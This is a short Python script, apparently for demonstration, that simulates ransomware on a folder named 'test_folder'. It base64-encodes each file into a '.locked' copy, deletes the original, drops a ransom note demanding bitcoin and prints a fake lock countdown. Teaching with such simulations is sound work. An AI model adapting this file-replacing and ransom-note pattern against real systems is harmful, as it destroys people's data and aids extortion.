import os
import base64
import time

TARGET_FOLDER = "test_folder"

def simulate_encryption(folder):
    for filename in os.listdir(folder):
        filepath = os.path.join(folder, filename)
        if os.path.isfile(filepath):
            with open(filepath, "rb") as file:
                content = file.read()
            encoded_content = base64.b64encode(content)
            with open(filepath + ".locked", "wb") as file:
                file.write(encoded_content)
            os.remove(filepath)
    print("[+] Files encrypted (simulated).")

def display_ransom_note(folder):
    note = (
        "Your files have been encrypted!\n"
        "To decrypt them, send 1000 BTC to our wallet.\n"
        "This is a simulation. No files were actually harmed.\n"
        "- RansomSim Team"
    )
    with open(os.path.join(folder, "READ_ME.txt"), "w") as note_file:
        note_file.write(note)
    print("[!] Ransom note dropped.")

def lock_simulation():
    print("\n[!] Simulating system lock...\n")
    for i in range(5, 0, -1):
        print(f"System locked. Reboot in {i} seconds...")
        time.sleep(1)
    print("System unlocked (simulation ends).\n")

if __name__ == "__main__":
    print(">>> Ransomware Simulation Starting...")
    simulate_encryption(TARGET_FOLDER)
    display_ransom_note(TARGET_FOLDER)
    lock_simulation()
    print(">>> Simulation Completed. No real harm done.")
